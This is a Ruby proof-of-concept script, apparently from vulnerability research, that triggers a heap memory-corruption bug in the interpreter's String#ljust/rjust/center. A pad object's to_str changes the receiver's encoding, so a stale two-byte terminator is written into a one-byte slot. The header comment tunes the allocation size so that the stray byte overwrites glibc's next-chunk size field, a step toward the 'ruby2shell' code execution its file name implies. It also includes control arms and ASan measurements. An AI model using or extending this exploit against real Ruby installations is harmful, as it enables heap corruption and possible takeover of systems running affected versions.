# W341: String#ljust/rjust/center termlen snapshot vs to_str encoding swap.
#
# 3.4.12 rb_str_justify (string.c:10864) captures
#   enc = STR_ENC_GET(str)            (:10878)
#   termlen = rb_enc_mbminlen(enc)    (:10879)
# BEFORE width = NUM2LONG(w) (:10880) and StringValue(pad) (:10882).
# A pad object's to_str can change the receiver's encoding; rb_enc_check
# (:10883) then recomputes the allocation encoding, but the stale termlen is
# still used by TERM_FILL (:10943). 3.4.13 also reads termlen at :10943,
# but after both hooks. This script tests that patch-sensitive window.
#
# arms:
#   attack  4096-byte UTF-16LE receiver (mbminlen 2), pad.to_str forces
#           US-ASCII; result allocates a 1-byte terminator but TERM_FILL
#           writes two zero bytes. 4103+1 = 4104 == 8 (mod 16), so on glibc
#           the extra byte reaches the next chunk's size LSB.
#   nomut   same receiver and pad object, to_str does not change encoding.
#   safe    ASCII receiver, pad.to_str forces US-ASCII (termlen 1 both ways).
#
# Negative result preserved (W343 witness qualifier): a 64-byte receiver is
# ASan-clean only while the result stays embedded — width 71/87 gives flags
# 0x800005. The same 64-byte receiver at width 2087 makes a heap result
# (flags 0x802005) and the same ASan WRITE of size 2; measured threshold on
# this build: width <=600 clean, >=620 dirty. The 4104-byte heap result in
# the attack arm above is what the size-LSB corruption requires.
#
# Usage: ruby ruby2shell-justify-termlen.rb attack|nomut|safe
arm = ARGV[0]
abort "usage: #{$0} attack|nomut|safe" unless %w[attack nomut safe].include?(arm)

n = arm == "safe" ? 4096 : 4096
$s = (arm == "safe" ? ("A" * n) : ("A" * n).dup.force_encoding(Encoding::UTF_16LE))
pad = Object.new
pad.define_singleton_method(:to_str) do
  $s.force_encoding(Encoding::US_ASCII) if arm == "attack"
  arm == "nomut" ? "Z".dup.force_encoding(Encoding::UTF_16LE) : "Z"
end

out = $s.ljust(4103, pad)
printf("RESULT arm=%s outlen=%d outenc=%s head=%s recv_len=%d recv_enc=%s\n",
       arm, out.bytesize, out.encoding.to_s, out.bytes.first(8).map { |b| "%02x" % b }.join,
       $s.bytesize, $s.encoding.to_s)
